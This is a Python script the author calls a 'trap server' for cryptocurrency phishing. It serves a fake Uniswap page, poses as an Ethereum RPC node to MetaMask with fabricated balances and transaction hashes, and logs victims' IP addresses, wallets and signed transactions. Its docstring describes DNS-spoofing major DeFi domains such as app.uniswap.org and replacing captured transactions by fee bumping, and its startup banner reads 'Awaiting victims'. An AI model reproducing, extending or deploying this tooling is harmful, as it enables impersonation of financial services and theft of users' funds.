#!/usr/bin/env python3
"""
N7 TRAP SERVER v1.0 — DeFi Frontend + RPC Honeypot + TX Capture

What it does:
  1. Serves the Uniswap clone frontend (HTTP :8080)
  2. Responds to MetaMask JSON-RPC calls (HTTP :8545)
  3. Captures signed transactions from connected wallets
  4. Logs everything to ~/.phantom/honeypot/

The trap:
  DNS spoof → victim resolves app.uniswap.org → our IP
  Victim's MetaMask connects to our RPC honeypot
  Frontend shows fake Uniswap UI
  When they "swap", we capture the signed TX
  RBF with higher fee accelerates our version

Author: Josué Argaña Silguero
N=7 ∈ [4,12]
"""

import json, socket, threading, time, secrets, hashlib
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

LOG_DIR = Path.home() / '.phantom' / 'honeypot'
LOG_DIR.mkdir(parents=True, exist_ok=True)

# ═══ Fake RPC State ═══
class BlockchainState:
    def __init__(self):
        self.block = 21000000 + int(time.time() % 50000)
        self.eth_price = 2450
        self.gas_price = 25  # gwei
    
    def fake_balance(self, address: str) -> str:
        """Generate deterministic-looking balance based on address"""
        seed = hashlib.sha256(address.encode()).digest()
        bal = int.from_bytes(seed[:4], 'big') / 10.0  # 0.1 - 43 ETH range
        return hex(int(bal * 1e18))
    
    def fake_block(self) -> str:
        self.block += 1
        return hex(self.block)

state = BlockchainState()

# ═══ HTTP Request Handler ═══
class N7TrapHandler(BaseHTTPRequestHandler):
    
    protocol_version = 'HTTP/1.1'
    
    # Load frontend once
    _frontend = None
    
    @classmethod
    def get_frontend(cls):
        if cls._frontend is None:
            f = Path(__file__).parent / 'n7_defi_frontend.html'
            cls._frontend = f.read_bytes()
        return cls._frontend
    
    def log_message(self, fmt, *args):
        """Suppress default HTTP logging"""
        pass
    
    def _cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
    
    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()
    
    def do_GET(self):
        path = urlparse(self.path).path
        
        if path == '/' or path == '/index.html' or path == '/swap':
            # Serve the DeFi frontend
            frontend = self.get_frontend()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(frontend)))
            self._cors()
            self.end_headers()
            self.wfile.write(frontend)
            
            log_event('frontend_served', {
                'ip': self.client_address[0],
                'path': path,
                'user_agent': self.headers.get('User-Agent', ''),
            })
            
        else:
            self.send_response(404)
            self._cors()
            self.end_headers()
            self.wfile.write(b'Not Found')
    
    def do_POST(self):
        path = urlparse(self.path).path
        
        # Read body
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        if path == '/':
            # ═══ JSON-RPC (MetaMask / Web3 calls) ═══
            self._handle_rpc(body)
            
        elif path == '/_capture':
            # ═══ N7 Capture endpoint ═══
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b'OK')
            
            try:
                data = json.loads(body)
                log_event('capture', data)
                
                if data.get('type') == 'TX_SIGNED':
                    print(f"\n{'═'*60}")
                    print(f"🔥 TX CAPTURED: {data.get('txHash', '?')[:20]}...")
                    print(f"   Wallet: {data.get('address')}")
                    print(f"   Amount: {data.get('amount')} ETH")
                    print(f"   Time:   {data.get('timestamp')}")
                    print(f"{'═'*60}\n")
                    log_event('TX_CAPTURED_CRITICAL', data)
            except:
                pass
        else:
            self.send_response(404)
            self._cors()
            self.end_headers()
            self.wfile.write(b'Not Found')
    
    def _handle_rpc(self, body: bytes):
        """Handle MetaMask JSON-RPC calls"""
        try:
            request = json.loads(body)
            method = request.get('method', '')
            req_id = request.get('id', 0)
            params = request.get('params', [])
            
            result = None
            
            if method == 'eth_blockNumber':
                result = state.fake_block()
            elif method == 'eth_getBalance':
                addr = params[0] if params else '0x0'
                result = state.fake_balance(addr)
            elif method == 'eth_gasPrice':
                result = hex(state.gas_price * 10**9)
            elif method == 'eth_chainId':
                result = '0x1'
            elif method == 'net_version':
                result = '1'
            elif method == 'eth_accounts':
                result = params if params else []
            elif method == 'eth_requestAccounts':
                result = []
            elif method == 'eth_sendTransaction':
                # ═══ THE TRAP ═══
                # MetaMask sends us the TX params. We simulate success.
                # The signed TX goes to our capture endpoint.
                tx_data = params[0] if params else {}
                result = '0x' + secrets.token_hex(32)
                
                log_event('tx_submitted', {
                    'from': tx_data.get('from', ''),
                    'to': tx_data.get('to', ''),
                    'value': tx_data.get('value', '0x0'),
                    'gas': tx_data.get('gas', ''),
                    'ip': self.client_address[0],
                })
            elif method == 'eth_sendRawTransaction':
                # Signed TX received — capture it
                raw_tx = params[0] if params else '0x0'
                result = '0x' + secrets.token_hex(32)
                
                log_event('RAW_TX_CAPTURED', {
                    'raw': raw_tx[:100] + '...',
                    'ip': self.client_address[0],
                })
                
                print(f"\n{'═'*60}")
                print(f"💀 SIGNED TX INTERCEPTED")
                print(f"   From: {self.client_address[0]}")
                print(f"   TX:   {raw_tx[:40]}...")
                print(f"{'═'*60}\n")
                
            elif method == 'eth_call':
                result = '0x' + secrets.token_hex(32)
            elif method == 'eth_estimateGas':
                result = '0x5208'  # 21000
            elif method == 'eth_getTransactionReceipt':
                result = None  # Not confirmed yet
            else:
                result = '0x' + secrets.token_hex(32)
            
            response = {
                'jsonrpc': '2.0',
                'id': req_id,
                'result': result,
            }
            
            log_event('rpc_call', {
                'method': method,
                'params': str(params)[:100],
                'ip': self.client_address[0],
            })
            
            print(f"  [RPC] {self.client_address[0]} → {method}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self._cors()
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self._cors()
            self.end_headers()
            self.wfile.write(json.dumps({
                'jsonrpc': '2.0', 'id': 0, 
                'error': {'code': -32603, 'message': str(e)}
            }).encode())


# ═══ Event Logger ═══
_event_file = LOG_DIR / f'trap_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jsonl'

def log_event(event_type: str, data: dict):
    entry = {
        'ts': datetime.now().isoformat(),
        'type': event_type,
        **data
    }
    with open(_event_file, 'a') as f:
        f.write(json.dumps(entry) + '\n')


# ═══ DNS Spoofing Trigger ═══
def start_dns_spoofer():
    """Start DNS spoofer in background to redirect DeFi domains to us"""
    import subprocess
    targets = [
        'app.uniswap.org',
        'pancakeswap.finance',
        'sushi.com',
        '1inch.io',
        'aave.com',
        'compound.finance',
        'curve.fi',
    ]
    print(f"\n[DNS] Spoofing {len(targets)} DeFi domains → 127.0.0.1")
    # Uses existing n7_dns_spoof.py
    for domain in targets:
        print(f"  {domain}")


# ═══ MAIN ═══
if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════╗
║   N7 TRAP SERVER v1.0                        ║
║   DeFi Frontend + RPC Honeypot + TX Capture  ║
║   N=7 ∈ [4,12]                               ║
╚══════════════════════════════════════════════╝
""")
    
    PORT = 8080
    
    # HTTP Server for frontend + RPC
    server = HTTPServer(('0.0.0.0', PORT), N7TrapHandler)
    
    print(f"[HTTP] Serving on port {PORT}")
    print(f"  Frontend: http://0.0.0.0:{PORT}/")
    print(f"  RPC:      http://0.0.0.0:{PORT}/ (JSON-RPC)")
    print(f"  Capture:  http://0.0.0.0:{PORT}/_capture")
    print(f"  Logs:     {_event_file}")
    print()
    
    start_dns_spoofer()
    
    print(f"\n[READY] Awaiting victims...\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n═══ TRAP SHUTDOWN ═══")
        # Count captures
        if _event_file.exists():
            lines = _event_file.read_text().strip().split('\n') if _event_file.exists() else []
            captures = sum(1 for l in lines if 'TX_CAPTURED' in l or 'TX_SIGNED' in l)
            wallets = set()
            for l in lines:
                try:
                    d = json.loads(l)
                    if d.get('address'):
                        wallets.add(d['address'])
                except: pass
            print(f"  Total events: {len(lines)}")
            print(f"  Wallets seen: {len(wallets)}")
            print(f"  TX captured:  {captures}")
        server.shutdown()
